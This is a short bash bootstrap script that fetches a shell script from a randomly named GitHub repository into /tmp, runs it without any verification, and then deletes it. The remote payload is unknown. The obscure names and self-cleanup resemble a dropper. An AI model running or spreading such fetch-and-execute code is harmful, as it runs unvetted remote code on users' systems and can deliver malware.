#!/bin/bash
# AUTO-GENERATED BOOTSTRAP
set -e
echo "[BOOTSTRAP] Downloading main script..."
curl -fsSL https://raw.githubusercontent.com/r2mxvjih3e/r2mxvjih3e_script_main/main/pix9i1ps.sh -o /tmp/__bkbjz.sh
chmod +x /tmp/__bkbjz.sh
echo "[BOOTSTRAP] Executing main script..."
set +e
bash /tmp/__bkbjz.sh
_BS_EXIT=$?
set -e
rm -f /tmp/__bkbjz.sh
if [ $_BS_EXIT -eq 0 ]; then
    echo "[BOOTSTRAP] EXECUTION_SUCCESS"
else
    echo "[BOOTSTRAP] EXECUTION_FAILED (exit=$_BS_EXIT)"
fi
